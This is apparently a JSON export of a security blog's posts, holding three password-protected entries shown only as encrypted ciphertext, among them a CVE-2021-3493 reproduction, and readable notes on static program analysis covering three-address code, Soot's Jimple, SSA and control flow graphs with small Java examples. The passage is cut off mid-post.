[{"title":"Flag","url":"https://pz1o.top/2099/09/27/Flag/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">这个看不了，别看了</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> 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 </div>","categories":[],"tags":[]},{"title":"PWN复现","url":"https://pz1o.top/2099/04/01/PWN复现/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"/> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\">  </div>","categories":[],"tags":["PWN"]},{"title":"CVE-2021-3493复现","url":"https://pz1o.top/2021/05/03/CVE-2021-3493复现/","content":"<script src=\"/crypto-js.js\"></script><script src=\"/mcommon.js\"></script><h3 id=\"encrypt-message\">Please enter the password to read the blog.</h3><link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css\"> <link rel=\"stylesheet\" href=\"//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css\"> <script src=\"//cdn.bootcss.com/jquery/1.11.3/jquery.min.js\"></script> <script src=\"//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js\"></script> <div id=\"security\"> <div> <div class=\"input-group\"> <input type=\"text\" class=\"form-control\" aria-label=\"Enter the password.\" id=\"pass\"> <div class=\"input-group-btn\"> <button type=\"button\" class=\"btn btn-default\" onclick=\"decryptAES()\">Decrypt</button> </div> </div> </div> </div> <div id=\"encrypt-blog\" style=\"display:none\"> U2FsdGVkX1+Zq1lMOuHX+/I2HgaCG4VMMhlBzr8lA6nBk3NNKNZGzBctsQq3H1weZ3dtbwasf5/VmJQ2Fs19EzuxrODMNg1naKB2vjHA0fEm0Q6tLYaXJMIDKN8st7VIdyfCZttvNG6r61l2eOGEOt8mQQ0N/stDwG9PsusQozk3jjK9UsZkQrzCYKIaQh5owN69VgWAgTuAfL48djRpHOYIeqwv7XPEwpJHwnJox+S6H9DE5c47ZkuAAZ5BAAmK9ZCH99FO4aJ829bONEpEbMNKiB+RChSG/s24B+frUNYvZPz50g5aZ6kYsfi6kihPlJh/U1RxhGk0PSI97JU6xyxLviaogYigr5JeXKYjXJ9oPxHsA8xZ3T68atNbZvan4oBQGI8i0uiaeHm8Axr8/TDO+4p1IV220CtGBQzo1oPT9QBBAWk4fFgvTsdfdMm9yQo15tJY3/CQ+uM5llbk+TAELdXJ01UTpJaJvjwNTLuU4OZ1KuXK06OCCO95znMh1lFch/0wEKY3V8U/S6T3sTT2hHfOtV4Le595HTEorjg7l4ehhjPcvEjoljnjPkOnrOy86iYXgqKo05vyDK+fRhjAtrjvDPLT+42gvWpB2IlV34AkUjXPVT8IrTnMQXM2YnNizfYAq1GWTwsGhRuAskjChu4WgU/EyDcNLyosvjInDsmyQ8T19RtuO2raLFLLbAU71VCWrQbGrAw3qhQvENmcPGnG9vQcnc8yeUruTwcQlh6nxH5ie5f/Um7p0Hbc6UA8uEVMP9vYqP9sPkNEmWfxSNcT2kAOT9NwVnfA34An+/ldooOnJgamm7mwDQVrD1DyhXFxNB1EFp6QStoel92clpD9Z4D/hIkGluU2ShYvxXndtHNkAHFd6IDFZyosA8nUeg+BVb9gWu8JUPp0/9QbLKxM7Ve//C3ly9VVqA1tTZtgCWej787I0yXcEy4MaYq6GlnRZtZWewdUBZ5k8LbptxYxrQWfXg0Eztv5e7Lai8se6wsubaz7wgxFkoPFbGgEvhz7Mx9rVQZPruOTFgEc9FO+lglrZsAGsKCKiee07IuQQg/5Y9LjoB56RT5qB9UJrJewkfM0yYOQE/kwsHh11wLF1vIQsgDUrnNdGgAUmL46oVYJP+qbDRTe5wuOBCL2H9j9s+b70qidruPB3tcENpQuVZ51+RFguRasllAgs+WZO0KftZheV30FwdUVj12pmmALDm0Hixf6mvWsWt5uDocnFeGN23LRUHQ+oy/vPaxqm/e6YorV2/1bjQ1oe348ry6rEblVDfRvaS4wSrf3UIdrmKES9/h1yf7Jxi3ysPe7hlK63/pte2OLd/3WqvMWouEyZd2CtYjYFUENrcELYRV/Hxu0on3VFQIPAb0Dg1AJzZBr5ftRQbKMwMK4fdURe9z1tFU9P261kp9kkawduPPPlKvVIne5w14KlyD34Dc6j1yLBhwz8FhJG9PrkUT8FYBYTJ9sokCNmUnmPNTsDU8ST9z3TonjD3Lj/Fh5o+LNmMzZoI+KCdyp+tI8JCGQ6vJjw0gtzaf5n7u1BDILF+pXEIZNuANkbMafaYb3XMxU+kWx9Jy/S8b0YiJyYLxRkO7R3ukVqAAU4Z9FYR1WsuS+rhnKberAHfOeg5Eq5C3k+QEAAQ57+yFCpgPNb45iBKChrZAP2wEoRMZ0qLVxap623V14JzsEp8Hhsg0= </div>","categories":[],"tags":["CVE复现"]},{"title":"static program","url":"https://pz1o.top/2021/05/03/static-program/","content":"<h1 id=\"0x01-Static-Program-Analysis\"><a href=\"#0x01-Static-Program-Analysis\" class=\"headerlink\" title=\"0x01 Static Program Analysis\"></a>0x01 Static Program Analysis</h1><h2 id=\"1-introduction\"><a href=\"#1-introduction\" class=\"headerlink\" title=\"1.introduction\"></a>1.introduction</h2><p><img src=\"/2021/05/03/static-program/image-20210315224533888.png\" alt=\"image-20210315224533888\"></p>\n<h2 id=\"2-sound-and-complete\"><a href=\"#2-sound-and-complete\" class=\"headerlink\" title=\"2.sound and complete\"></a>2.sound and complete</h2><p><img src=\"/2021/05/03/static-program/image-20210315231054502.png\" alt=\"image-20210315231054502\"></p>\n<p><img src=\"/2021/05/03/static-program/image-20210315231536756.png\" alt=\"image-20210315231536756\"></p>\n<h2 id=\"3-what-is-static-analysis\"><a href=\"#3-what-is-static-analysis\" class=\"headerlink\" title=\"3.what is static analysis\"></a>3.what is static analysis</h2><p>a view as this draw</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316000124963.png\" alt=\"image-20210316000124963\"></p>\n<h2 id=\"4-abstraction-and-overapproximation\"><a href=\"#4-abstraction-and-overapproximation\" class=\"headerlink\" title=\"4.abstraction and overapproximation\"></a>4.abstraction and overapproximation</h2><p>first,abstraction</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316000642671.png\" alt=\"image-20210316000642671\"></p>\n<p>next,transfer function</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316001346346.png\" alt=\"image-20210316001346346\"></p>\n<p>it is similar to Symbolic execution</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316001430168.png\" alt=\"image-20210316001430168\"></p>\n<p>last control flow.</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316001748641.png\" alt=\"image-20210316001748641\"></p>\n<h1 id=\"0x02-Intermediate-Representation\"><a href=\"#0x02-Intermediate-Representation\" class=\"headerlink\" title=\"0x02 Intermediate Representation\"></a>0x02 Intermediate Representation</h1><h2 id=\"1-Compiler\"><a href=\"#1-Compiler\" class=\"headerlink\" title=\"1.Compiler\"></a>1.Compiler</h2><p><img src=\"/2021/05/03/static-program/image-20210316010120880.png\" alt=\"image-20210316010120880\"></p>\n<h2 id=\"2-AST-vs-IR\"><a href=\"#2-AST-vs-IR\" class=\"headerlink\" title=\"2.AST vs IR\"></a>2.AST vs IR</h2><p><img src=\"/2021/05/03/static-program/image-20210316010715717.png\" alt=\"image-20210316010715717\"></p>\n<h2 id=\"3-3-Address-Code\"><a href=\"#3-3-Address-Code\" class=\"headerlink\" title=\"3.3-Address Code\"></a>3.3-Address Code</h2><p><img src=\"/2021/05/03/static-program/image-20210316010948812.png\" alt=\"image-20210316010948812\"></p>\n<p><strong>Forms</strong></p>\n<p><img src=\"/2021/05/03/static-program/image-20210316012707595.png\" alt=\"image-20210316012707595\"></p>\n<h2 id=\"4-Soot-‘s-‘Jimple\"><a href=\"#4-Soot-‘s-‘Jimple\" class=\"headerlink\" title=\"4.Soot ‘s ‘Jimple\"></a>4.Soot ‘s ‘Jimple</h2><h3 id=\"for\"><a href=\"#for\" class=\"headerlink\" title=\"for\"></a>for</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">ForLoop3AC</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> x=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">10</span>;i++)&#123;</span><br><span class=\"line\">\t\t\tx = x+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/03/static-program/image-20210316012632094.png\" alt=\"image-20210316012632094\"></p>\n<h3 id=\"do…while\"><a href=\"#do…while\" class=\"headerlink\" title=\"do…while\"></a>do…while</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DoWhileLoop3AC</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span>[] arr = <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[<span class=\"number\">10</span>];</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">do</span>&#123;</span><br><span class=\"line\">\t\t\ti = i+<span class=\"number\">1</span>;</span><br><span class=\"line\">\t\t&#125;<span class=\"keyword\">while</span>(arr[i]&lt;<span class=\"number\">10</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/03/static-program/image-20210316013150012.png\" alt=\"image-20210316013150012\"></p>\n<blockquote>\n<p>$代表临时变量</p>\n</blockquote>\n<h3 id=\"method-call\"><a href=\"#method-call\" class=\"headerlink\" title=\"method call\"></a>method call</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MethodCall3AC</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"function\">String <span class=\"title\">foo</span><span class=\"params\">(String para1, String para2)</span></span>&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> para1 + <span class=\"string\">\" \"</span> + para2;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String []args)</span></span>&#123;</span><br><span class=\"line\">\tMethodCall3AC mc = <span class=\"keyword\">new</span> MethodCall3AC();</span><br><span class=\"line\">    String result = mc.foo(<span class=\"string\">\"hello\"</span>,<span class=\"string\">\"world\"</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p><code>method signature</code>:class name/return type/method name(parameter1 type,parameter2 type…)</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316125222155.png\" alt=\"image-20210316125222155\"></p>\n</blockquote>\n<p><img src=\"/2021/05/03/static-program/image-20210316124211598.png\" alt=\"image-20210316124211598\"></p>\n<p><img src=\"/2021/05/03/static-program/image-20210316124243765.png\" alt=\"image-20210316124243765\"></p>\n<h3 id=\"class\"><a href=\"#class\" class=\"headerlink\" title=\"class\"></a>class</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Class3AC</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"keyword\">double</span> pi = <span class=\"number\">3.14</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/05/03/static-program/image-20210316125913305.png\" alt=\"image-20210316125913305\"></p>\n<h2 id=\"5-SSA-Static-Single-Assignment\"><a href=\"#5-SSA-Static-Single-Assignment\" class=\"headerlink\" title=\"5.SSA(Static Single Assignment)\"></a>5.SSA(Static Single Assignment)</h2><p>Every variable has exactly one definition</p>\n<p>function to deal with two or many variables</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316130354246.png\" alt=\"image-20210316130354246\"></p>\n<h2 id=\"6-Control-Flow-Graph\"><a href=\"#6-Control-Flow-Graph\" class=\"headerlink\" title=\"6.Control Flow Graph\"></a>6.Control Flow Graph</h2><p>Nodes:BBs</p>\n<p>Edge</p>\n<p><img src=\"/2021/05/03/static-program/image-20210316130826596.png\" alt=\"image-20210316130826596\"></p>\n<h3 id=\"Basic-Block\"><a href=\"#Basic-Block\" class=\"headerlink\" title=\"Basic Block\"></a>Basic Block</h3><p><strong>definition</strong></p>\n<ol>\n<li>It can be entered only at the beginning.</li>\n<li>It can be exited only at the end</li>\n<li>It should be a maximal.</li>\n</ol>\n<p><strong>how to build it</strong></p>\n<p>determine leader </p>\n<p><img src=\"/2021/05/03/static-program/image-20210316131723881.png\" alt=\"image-20210316131723881\"></p>\n<p>eg:</p>\n<p>这个例子太形象了，不得不用中文说一下</p>\n<ol>\n<li>first,determine leader(first instruction/jump target/follow jump)</li>\n<li>build BBs</li>\n</ol>\n<p><img src=\"/2021/05/03/static-program/image-20210316132039750.png\" alt=\"image-20210316132039750\"></p>\n<h3 id=\"Edge\"><a href=\"#Edge\" class=\"headerlink\" title=\"Edge\"></a>Edge</h3><p><strong>how to</strong></p>\n<p>There are two cases</p>\n<p><img 